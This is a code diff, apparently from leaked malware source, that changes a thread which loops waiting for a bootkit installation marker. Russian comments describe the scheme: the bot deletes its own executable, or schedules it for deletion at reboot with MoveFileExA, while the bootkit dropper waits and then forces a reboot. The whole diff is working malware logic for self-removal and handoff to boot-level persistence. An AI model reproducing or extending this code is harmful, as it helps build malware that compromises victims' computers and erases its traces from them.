@@ -23,6 +23,13 @@ BOOL isFileExist11(CHAR* filename)
 
 DWORD WINAPI IsBootkitInstaledThread( LPVOID lpData )
 {
+	// Сделан вечный цикл ожидания файла установки буткита.
+	// Если он находится, делается попытка удалить свой файл.
+	// Если получается - то просто удаляет файл признака, что означает 
+	// успех и продолжает свою работу. Всё равно после этого произойдёт ребут.
+	// Если не получается - то помечает файл бота на удаление после ребута.
+	// В это время дропер буткита ждет некоторое время успешного удаления и 
+	// после некоторого ожидания - всё равно делает ребут.
 	while(true)
 	{
 		PCHAR Path= STR::Alloc(MAX_PATH);
@@ -51,30 +58,25 @@ DWORD WINAPI IsBootkitInstaledThread( LPVOID lpData )
 				if (!(BOOL)pDeleteFileA(BOT))
 				{
 					BD_MSG("bootkit","no delfile %d",(DWORD)pGetLastError());
-					
-					//GetLastError();
+					pMoveFileExA(BOT, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
 				}
 				else
 				{
 					BD_MSG("bootkit","Файл удален ");
+					pSetFileAttributesA( Path, FILE_ATTRIBUTE_NORMAL );
+					pDeleteFileA(Path);
 				}
-
 			}
 			STR::Free(BOT);
-			STR::Free(Pref);
-			
-			pDeleteFileA(Path);
-			STR::Free(Path);
-			STR::Free(UID);
-			break;
 		}
+		STR::Free(Pref);
 		STR::Free(Path);
 		STR::Free(UID);
 		pSleep(1000*30);
-		
 	}
 	return 0;
 }
+
 void IsBootkitInstaled()
 {
 	StartThread(IsBootkitInstaledThread,NULL);
